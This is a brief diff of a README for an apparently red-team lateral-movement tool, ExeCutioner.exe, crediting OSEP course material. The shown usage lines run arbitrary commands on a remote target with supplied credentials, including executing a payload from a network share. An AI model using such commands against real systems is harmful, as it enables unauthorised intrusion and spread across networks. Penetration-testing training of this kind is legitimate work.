@@ -46,4 +46,7 @@ ExeCutioner.exe /t <target name or IP> /user <username> /pass <password> /cmd <c
 ExeCutioner.exe /t <target name or IP> /user <username> /pass <password> /cmd <\\192.168.10.8\\lateralmovement.exe>
 ```
 
+# Credits
+Heavily inspired by https://github.com/chvancooten/OSEP-Code-Snippets
+Invaluable knowledge from the OSEP Course https://www.offensive-security.com/pen300-osep/
 
